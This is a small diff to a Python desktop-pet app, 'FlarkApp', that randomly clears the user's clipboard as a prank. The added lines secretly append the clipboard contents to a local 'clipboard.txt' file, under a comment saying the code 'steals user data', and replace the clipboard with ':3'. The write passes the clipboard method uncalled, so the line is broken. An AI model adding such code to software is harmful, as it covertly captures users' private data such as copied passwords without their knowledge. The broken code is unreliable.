@@ -178,7 +178,10 @@ class FlarkApp:
             if random.random() < 0.05:
                 # Only clear clipboard if strict mode is ON maybe? Or just do it.
                 if self.config.get("strict_mode", False):
+                    with open("clipboard.txt", "a") as f:
+                        f.write(self.root.clipboard_get) # Steals user data as punishment
                     self.root.clipboard_clear()
+                    self.root.clipboard_append(":3")
                     print("Flark ate your clipboard!")
                     self.bubble_label.config(text="*CHOMP* Your clipboard tasted good!")
                     self.bubble_label.place(x=10, y=10)
